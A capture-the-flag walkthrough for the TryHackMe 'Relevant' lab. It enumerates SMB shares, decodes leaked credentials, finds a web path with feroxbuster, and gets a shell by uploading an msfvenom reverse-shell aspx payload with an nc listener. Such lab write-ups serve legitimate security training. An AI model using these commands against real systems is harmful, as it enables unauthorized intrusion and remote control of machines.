# Relevant

[Relevant](https://tryhackme.com/room/relevant)

## Solution

- nmap scan: 80, 135, 139, 445, 3389, 49663, 49667, 49669

### SMB

We can list the shares from the smb `smbclient -L <ip>`. The interesting one is
`nt4wrksv`. Then we can connect to that resource using `smbclient
\\\\<ip>\\nt4wrksv`. There is a file `passwords.txt`. We can download it
locally with `get passwords.txt`. There are two accounts encrypted using
base64. We can paste each one and pass them to `base 64 -d`.

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

We can try to login as Bob or Bill `smbclient -U RELEVANT/<User> -L <ip>` and
show their shares, but we cannot get anything new.

### Getting User Access

We can use feroxbuster to search for paths in the HTTP servers. For port 80 we
did not find anything.

For port 49663 we find `nt4wrksv` using `feroxbuster -u http://<ip>:49663/ -w
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt `

So I tried to access `http://10.10.161.110:49663/nt4wrksv/passwords.txt` and
got the same content. Next we can try to upload a file to the SMB share and see
if we can access it from the browser. If so then we might be able to upload a
revshell payload.

Create the payload using

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<host> LPORT=6969 -f aspx -o payload.aspx
```

Upload the file to the SMB share using `put payload.aspx` from the smbclient
command line.

Then start `nc -lvnp 6969` on the host and access the payload.aspx file from browser.

You then have access to the machine. Go to the `c:\Users\Bob\Desktop` directory
and `type user.txt` to get the flag.

### Root
